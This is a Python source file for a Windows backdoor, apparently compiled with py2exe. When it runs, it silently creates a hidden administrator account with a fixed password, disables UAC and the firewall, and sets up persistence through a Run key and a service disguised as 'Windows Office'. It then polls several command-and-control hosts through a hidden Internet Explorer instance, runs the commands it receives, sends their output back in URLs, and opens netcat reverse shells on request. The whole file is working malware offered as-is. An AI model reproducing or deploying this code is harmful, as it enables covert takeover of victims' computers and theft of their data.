#import win32serviceutil
#import win32service
#import win32event

#import servicemanager
import threading
import asyncore
import time
import sys
import os

#import Crypto
#import ecdsa
#import paramiko
import subprocess
import httplib
import requests
#import email
#from email import utils
import urllib2
#import pycurl
from os import path, access, R_OK
from uuid import getnode as get_mac
from subprocess import Popen
import  win32gui, win32com, pythoncom, win32con
from win32com.client import Dispatch
from time import sleep
import _winreg

#python C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\setupupie.py py2exe --includes calendar,email,locale

def getProxy():
    try:
        proxy = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
        server, type = _winreg.QueryValueEx(proxy, "ProxyServer")
        enabled, type = _winreg.QueryValueEx(proxy, "ProxyEnable")
        if enabled:
            return server
        return 'None'
    except:
        return 'None'

def get_macaddress(host='localhost'):
    """ Returns the MAC address of a network host, requires >= WIN2K. """
    # http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/347812
    import ctypes
    import socket
    import struct
 
    # Check for api availability
    try:
        SendARP = ctypes.windll.Iphlpapi.SendARP
    except:
        raise NotImplementedError('Usage only on Windows 2000 and above')
 
    # Doesn't work with loopbacks, but let's try and help.
    if host == '127.0.0.1' or host.lower() == 'localhost':
        host = socket.gethostname()
 
    # gethostbyname blocks, so use it wisely.
    try:
        inetaddr = ctypes.windll.wsock32.inet_addr(host)
        if inetaddr in (0, -1):
            raise Exception
    except:
        hostip = socket.gethostbyname(host)
        inetaddr = ctypes.windll.wsock32.inet_addr(hostip)
 
    buffer = ctypes.c_buffer(6)
    addlen = ctypes.c_ulong(ctypes.sizeof(buffer))
    if SendARP(inetaddr, 0, ctypes.byref(buffer), ctypes.byref(addlen)) != 0:
        raise WindowsError('Retreival of mac address(%s) - failed' % host)
 
    # Convert binary data into a string.
    macaddr = ''
    for intval in struct.unpack('BBBBBB', buffer):
        if intval > 15:
            replacestr = '0x'
        else:
            replacestr = 'x'
        if macaddr != '':
            #macaddr = ':'.join([macaddr, hex(intval).replace(replacestr, '')])
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
        else:
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
 
    return macaddr.upper()







CREATE_NO_WINDOW = 0x08000000
swin=os.getenv('windir')
subprocess.call("net.exe user asp Qwerty12 /add", creationflags=CREATE_NO_WINDOW)
subprocess.call("net.exe localgroup administrators asp /add", creationflags=CREATE_NO_WINDOW)
subprocess.call("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f", creationflags=CREATE_NO_WINDOW)
subprocess.call("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f", creationflags=CREATE_NO_WINDOW)
subprocess.call("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f", creationflags=CREATE_NO_WINDOW)
subprocess.call("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v EnableLua /t REG_DWORD /d 0 /f", creationflags=CREATE_NO_WINDOW)
try:
        subprocess.call("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false", creationflags=CREATE_NO_WINDOW)    
except:
        notfound=1
subprocess.call("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f", creationflags=CREATE_NO_WINDOW)
if not os.path.exists('c:\windows\syswow64'):
        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f', creationflags=CREATE_NO_WINDOW)
        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f', creationflags=CREATE_NO_WINDOW)
        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f', creationflags=CREATE_NO_WINDOW)
else:
        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f /reg:64', creationflags=CREATE_NO_WINDOW)
        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f /reg:64', creationflags=CREATE_NO_WINDOW)
        #subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64', creationflags=CREATE_NO_WINDOW)
        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64', creationflags=CREATE_NO_WINDOW)

subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
#subprocess.call("net.exe user Administrator Qwerty12", creationflags=CREATE_NO_WINDOW)
subprocess.call("net.exe user asp Qwerty12", creationflags=CREATE_NO_WINDOW)
try:
        subprocess.call("TASKKILL /F /IM wup.exe", creationflags=CREATE_NO_WINDOW)
        #subprocess.call("TASKKILL /F /IM up.exe", creationflags=CREATE_NO_WINDOW)
except:
        notfound=1
subprocess.call("cmd /c del /y "+swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
subprocess.call("cmd /c del /y c:\\windows\\temp\\upd.exe", creationflags=CREATE_NO_WINDOW)
subprocess.call("TASKKILL /F /IM wuc.exe", creationflags=CREATE_NO_WINDOW)
subprocess.call("TASKKILL /F /IM nc.exe", creationflags=CREATE_NO_WINDOW)
subprocess.call("TASKKILL /F /IM nc64.exe", creationflags=CREATE_NO_WINDOW)
###subprocess.call("Net Stop ""avast!Antivirus""")
subprocess.call("cmd /c del /y "+os.getenv('windir')+"\\wuc.exe", creationflags=CREATE_NO_WINDOW)
subprocess.call("sc delete wup", creationflags=CREATE_NO_WINDOW)
subprocess.call("cmd /c del /y "+os.getenv('temp')+"\\up*", creationflags=CREATE_NO_WINDOW)
subprocess.call("cmd /c copy /y "+os.getenv('windir')+"\\upda.exe "+os.getenv('windir')+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)

#main loop here
site="paner.altervista.org"
site1="paner.altervista.org"
site2="52.26.124.145"
site3="certificates.ddns.net"
smacaddress = get_macaddress('localhost')
sTime=time.ctime(os.path.getmtime(os.getenv('windir')+"\\up.exe"))
sTime=sTime.replace(" ","_")
sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress#+"_"+os.getenv('USERNAME')
pythoncom.CoInitialize()
ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0
while True:
        #sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_"+os.getenv('USERNAME')
        if getProxy()!='None':
            subprocess.call("taskkill /f /im wup.exe", creationflags=CREATE_NO_WINDOW)
        
            try:
                    #top_level_url="http://52.26.124.145:31287"
                    top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
                    
                    ie.Navigate(top_level_url)
                    if ie.Busy:
                        sleep(5)
                    sresponse = ie.Document.body.innerText
                    #print text
                    #ie.quit
                    #os.system('taskkill /f /im iexplore.exe')
                    if sresponse!= '':
                            print "Output from HTML request"
                            #sresponse = response.read()
                            ifind=sresponse.find('ip=')
                            sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                            ifind=sresponse.find('port=')
                            sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('kill=')
                            skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('iout=')
                            sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('exec=')
                            sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('cmd=')
                            scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                            print skill
                    else:
                            if site == site1:
                                site=site2
                            elif site == site2:
                                site=site3
                            elif site == site3:
                                site=site1
                            top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
                            ie.Navigate(top_level_url)
                            if ie.Busy:
                                sleep(5)
                            sresponse = ie.Document.body.innerText
                            print "Output from HTML request"
                            #sresponse = response.read()
                            ifind=sresponse.find('ip=')
                            sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                            ifind=sresponse.find('port=')
                            sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('kill=')
                            skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('iout=')
                            sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('exec=')
                            sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                            ifind=sresponse.find('cmd=')
                            scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                            print skill
                    #httpServ.close()
                    if sexec == '1':
                            sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
                            try:
                                    if sout == '1':
                                            
                                        sdump=subprocess.check_output(scmd,stderr=subprocess.STDOUT, shell=True)
##                                        process=subprocess.Popen(scmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT, shell=True)
##                                        p = Popen(scmd,shell=True)
##                                        returncode = process.wait()
##                                        print('return code'.format(returncode))
##                                        sdump=process.stdout.read()
            
                                        print sdump
                                        
##                                        text_file = open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME+".txt", "w")
##                                        text_file.write(sdump)
##                                        text_file.close()
##                                        files = {'userfile': open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME+".txt", 'rb')}
##                                        r = requests.post('http://' + site +'/upload.php',files=files)  
                                        #if len(sdump)<2006:
                                        #sdump = sdump.replace("\'", "")
                                        #sdump = sdump.replace("\\", "\\\\")
                                        sdump = sdump.replace("\r\n", "<br>")
                                        #sdump = sdump.replace("%", "")
                                        #sdump = sdump.replace("*", "")
                                        #sdump = sdump.replace("\n", "<br>")
                                        #sdump = sdump.replace("\r", "<br>")
                                        
                                        #sdump = sdump.replace(" ", "%20")
                                        #sdump = sdump[ 0 : 2005]
                                        top_level_url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump
                                        ie.Navigate(top_level_url)
                                        if ie.Busy:
                                            sleep(5)
                                        sresponse = ie.Document.body.innerText
                                        
                                        top_level_url = "http://"+site+"/svc/dump.php?pc="+sCOMPUTERNAME+"&dump="+sdump
                                        ie.Navigate(top_level_url)
                                        if ie.Busy:
                                            sleep(5)
                                        sresponse = ie.Document.body.innerText
                                       
                                            
                                    else:
                                        p = Popen(scmd,shell=True)
                            #print r.text
                            except Exception,e:
                                    print str(e)
                                                    
                            #httpServ = httplib.HTTPConnection(site, 80)
                            #httpServ.connect()
                           
                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                            if ie.Busy:
                                    sleep(5)
                            sresponse = ie.Document.body.innerText
                            #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"_"+os.getenv('USERNAME')+"&exec=0")
                            #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                            #response = httpServ.getresponse()
                            #httpServ.close()
                    if skill == '0':
                            try:
                                    if not os.path.exists('c:\windows\syswow64'):
                                            p = Popen("nc.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                    #os.system("nc.exe -e cmd.exe "+sip+" "+sport)
                                    else:
                                            p = Popen("nc64.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                    #os.system("nc64.exe -e cmd.exe "+sip+" "+sport)
                            except Exception,e:
                                    print str(e)
                            #httpServ = httplib.HTTPConnection(site, 80)
                            #httpServ.connect()
                            ie.Navigate("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                            if ie.Busy:
                                    sleep(5)
                            sresponse = ie.Document.body.innerText
                            #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                    site=site1
            except Exception,e:
                    print str(e)
                    print e.errno
                    #if e.errno == 11001:
                    if site == site1:
                        site=site2
                    elif site == site2:
                        site=site3
                    elif site == site3:
                        site=site1
        else:
            subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
            #subprocess.call("taskkill /f /im up.exe", creationflags=CREATE_NO_WINDOW)
        time.sleep(5)


                                               
